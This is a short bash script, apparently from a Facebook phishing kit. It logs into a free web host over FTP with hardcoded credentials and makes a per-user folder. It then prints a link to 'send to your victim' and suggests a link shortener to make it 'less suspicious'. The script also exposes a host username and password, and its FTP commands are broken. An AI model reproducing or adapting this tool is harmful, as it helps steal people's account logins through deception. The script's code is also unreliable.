#!/bin/bash 
echo "Enter your email:"
read EMAIL
HOST='ftpupload.net' 
USER='epiz_32719615'
PASSWD='ElDdJprQglYAk'
FILE='index.html'
FILE2='log.php'
FILE3='pass.txt'
ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
binary
cd htdocs/fb
mkdir $EMAIL
cd htdocs/fb/$EMAIL/link
start pass.txt
quit
END_SCRIPT
echo
echo "Send the link below to your victim:"
echo "Link: http://clipush.42web.io/fb/$EMAIL/link/" 
echo
echo "Use link shortener like bit.ly to"
echo "make the link less suspicious"
exit 0
python view.py